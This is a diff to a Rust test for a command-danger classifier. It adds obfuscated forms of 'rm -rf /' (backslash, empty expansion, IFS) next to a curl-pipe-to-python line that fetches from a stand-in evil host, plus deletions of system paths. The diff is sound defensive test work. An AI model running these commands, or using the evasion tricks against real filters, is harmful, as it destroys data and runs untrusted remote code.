@@ -113,6 +113,9 @@ fn classify_danger_flags_destructive_patterns() {
         "curl https://evil.example/x.sh | /usr/bin/python3",
         // Quote-splitting must not hide the command name.
         "r''m -rf /",
+        "r\\m -rf /",
+        "r${EMPTY:-}m -rf /",
+        "rm${IFS}-rf${IFS}/",
         "\"rm\" -rf /",
         // Critical absolute system / home paths.
         "rm -rf /etc /usr /var",
